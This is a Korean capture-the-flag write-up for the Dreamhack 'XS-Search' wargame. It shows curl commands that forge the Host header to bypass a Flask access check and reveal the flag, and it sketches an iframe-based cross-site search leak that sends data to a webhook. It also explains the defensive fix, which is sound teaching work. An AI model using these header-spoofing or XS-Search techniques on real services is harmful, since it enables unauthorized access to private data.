---
layout: post
title:  "Dreamhack 워게임 XS-Search 풀이 — Host header 한 줄로 의도된 XS-Search 우회"
date:   2026-05-16 20:30:00 +0900
categories: security web wargame dreamhack writeup xs-search host-header
---

## 들어가며

Dreamhack 웹해킹 워게임 **XS-Search** (id 443, 풀이자 678명+, Gold 3) 풀이입니다.

문제의 의도는 이름 그대로 **Cross-Site Search** (`iframe.contentWindow.frames.length` 같은 cross-origin 으로도 읽히는 속성을 이용해 검색 결과 유무를 한 글자씩 빼내는 것) 인데, 소스를 한 줄만 자세히 보면 **그냥 `Host` 헤더만 바꿔도 끝나는** 인증 우회 버그가 있다. XS-Search 안 해도 됨.

전체 풀이는 `curl` 한 줄:

```bash
$ curl -H "Host: 127.0.0.1:8000" "$URL/search?query=DH"
... <iframe srcdoc="<pre>DH{22d1445ad68e194e044a16dc644371f3}</pre>"></iframe>
```

🚩 **`DH{22d1445ad68e194e044a16dc644371f3}`**

이게 의도된 풀이인지, intended XS-Search side-channel 풀이를 막다가 새어나간 버그인지는 모르겠지만 — 어쨌든 통한다.

> Note: 정보보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

---

## 1. 소스 정독 — 노트 검색 서비스

### 1-1. 데이터

```python
notes = {
    (FLAG, True),
    ("Hello World", False),
    ("DreamHack", False),
    ("carpe diem, quam minimum credula postero", False)
}
```

4 개의 노트. `True` 면 private, `False` 면 public. FLAG 만 private.

### 1-2. `/search` 의 접근 제어 — 여기가 버그

```python
@app.route('/search')
def search():
    query = request.args.get('query', None)
    if query == None:
        return render_template("search.html", query=None, result=None)
    for note, private in notes:
        if private == True and request.remote_addr != "127.0.0.1" \
                           and request.headers.get("HOST") != "127.0.0.1:8000":
            continue
        if query != "" and query in note:
            return render_template("search.html", query=query, result=note)
    return render_template("search.html", query=query, result=None)
```

**한 번 더 풀어 쓰면:**

```python
if private == True
   and request.remote_addr != "127.0.0.1"
   and request.headers.get("HOST") != "127.0.0.1:8000":
    continue  # private 노트 건너뜀
```

private 노트는 **다음 두 조건 중 하나라도 만족하면** 검색 가능:

1. `request.remote_addr == "127.0.0.1"` (요청자 IP 가 loopback)
2. `request.headers.get("HOST") == "127.0.0.1:8000"` (Host 헤더 매칭)

**의도된 흐름:**

- 봇 (`/submit` 으로 URL 제출 → selenium chrome 이 127.0.0.1 안에서 방문) 만 조건 1 만족.
- 외부 공격자는 두 조건 다 못 만족 → private 노트 (FLAG) 검색 불가.
- 따라서 봇을 통한 cross-site search 가 필요 — 정통 XS-Search.

**그러나 — 조건 2 가 거의 무방비.** `Host` 헤더는 **공격자가 임의로 설정할 수 있다**. curl 한 줄이면 충분.

### 1-3. Render 결과

`search.html`:

```jinja
{% if result %}
  <h3>Searching "{{ query }}" found</h3>
  <iframe srcdoc="<pre>{{ result }}</pre>"></iframe>
{% elif query %}
  <h3>Searching "{{ query }}" not found</h3>
```

match 가 있으면 iframe 안에 결과 텍스트가 통째로 들어간다. (XS-Search side-channel 의도가 보임 — `<iframe>` 의 frames.length 가 0 vs 1 로 매칭 여부가 cross-origin 으로 셀 수 있음.)

---

## 2. 익스플로잇 — Host 헤더 위조

```bash
$ URL="http://host3.dreamhack.games:24487"

# 일반 (loopback 도 아니고 Host 도 매칭 안 됨)
$ curl -s "$URL/search?query=DH" | grep h3
  <h3> Searching "DH" not found</h3>

# 같은 query, Host 만 변조
$ curl -s -H "Host: 127.0.0.1:8000" "$URL/search?query=DH" | grep -A 1 h3
  <h3>Searching "DH" found</h3>
  <iframe srcdoc="<pre>DH{22d1445ad68e194e044a16dc644371f3}</pre>"></iframe>
```

🚩 **`DH{22d1445ad68e194e044a16dc644371f3}`**

---

## 3. 왜 이게 통하나 — Host header trust 의 안티패턴

`request.headers.get("HOST")` 는 **클라이언트가 보낸 HTTP request 의 `Host:` 헤더** 다. HTTP 1.1 의 virtual hosting 용으로 정의된 헤더이고, 클라이언트가 임의로 설정한다. 일반 브라우저는 URL 의 host 부분을 그대로 박지만, `curl -H` 나 raw socket 으로는 무엇이든 보낼 수 있다.

이걸 **인증/접근 제어** 결정에 쓰는 건 거의 항상 잘못. Flask `request.host` / `request.headers["Host"]` 는 **trusted source 가 아님**.

| 잘못된 사용처 | 무엇이 잘못되나 |
|---------------|-----------------|
| 권한 검사 (`if Host==...`) | 공격자가 곧바로 set |
| URL 생성에 박기 | Host header injection → cache poisoning, password reset poisoning |
| 로그/리포팅 | 위조된 값으로 오염 |

올바르게는 **reverse proxy (nginx, etc.) 가 검증** + `X-Forwarded-Host` 류는 trusted proxy 만 신뢰. Flask 자체 코드에서는 `ALLOWED_HOSTS` 비슷한 화이트리스트를 두는 게 보통.

---

## 4. (참고) 의도된 풀이는 XS-Search

`Host` 헤더 우회를 막았다고 가정하고 — 그러면 진짜로 cross-site search 가 필요했을 것이다. 30초 스케치만:

**아이디어:**

- `/search?query=X` 의 응답은 match 여부에 따라 **iframe 의 유무** 가 다름.
- cross-origin 으로도 `iframe.contentWindow.frames.length` 는 읽힌다 (number 만 노출, contents 는 SOP 차단).
- 따라서 attacker 페이지에서 `/search?query=DH{<prefix><c>}` 를 iframe 으로 로드 → 0.5초 후 `frames.length` 체크 → 1 이면 prefix+c 가 매치.
- prefix 를 한 글자씩 늘려가며 32 회 반복.

**봇이 attacker 페이지를 방문 (loopback 만족) → attacker JS 가 / search 를 iframe 으로 로드 → 결과를 webhook 에 exfil → 다음 글자 시도** 의 chain.

3초 페이지 로드 타임아웃이라 한 번 방문에 16 글자 정도 빼내는 패턴이 일반적. 이 문제에서는 Host 헤더로 우회 가능하니 안 해도 되지만, 학습 가치로는 의도된 풀이가 더 흥미롭다.

---

## 5. 시도한 것 중 실패한 것들 — 회고

이 문제는 헛수고가 거의 없었다. 운 좋게도 소스 5줄 읽다가 `request.headers.get("HOST")` 의 위치를 보고 바로 의심.

다만 **사전 가정 한 가지** 가 다른 풀이에서 자주 시간 잡아먹는다:

### 5-1. (잠재적) 헛수고 — "이름이 XS-Search 니까 XS-Search 로 풀어야 한다"

문제 이름 / 카테고리 / 폴더 구조에 끌려서 의도된 기법으로만 풀려고 하면, 더 쉬운 logic bug 를 놓친다. 이 문제도 의도된 풀이는 XS-Search 인데, Host header 한 줄이 먼저 보이면 그게 정답.

**다음엔:** 어떤 문제든 **인증/접근제어 코드부터 먼저 본다**. side-channel 같은 화려한 기법은 그 다음. 가장 흔한 web 취약점 카테고리 (auth bypass, IDOR, SSRF, injection) 가 정통 XSS / XS-Search 보다 거의 항상 더 쉽다.

### 5-2. (잠재적) 헛수고 — `request.host` vs `request.headers["Host"]`

Flask 에서 `request.host` 는 약간 다르게 동작 (proxy 헤더 고려). 이 문제는 `request.headers.get("HOST")` 를 직접 읽으니 raw header 값. 만약 코드가 `request.host` 였다면 더 까다로웠을 수도. **헤더-기반 검사 보면 어떤 API 로 읽는지** 정확히 확인.

---

🚩 `DH{22d1445ad68e194e044a16dc644371f3}`
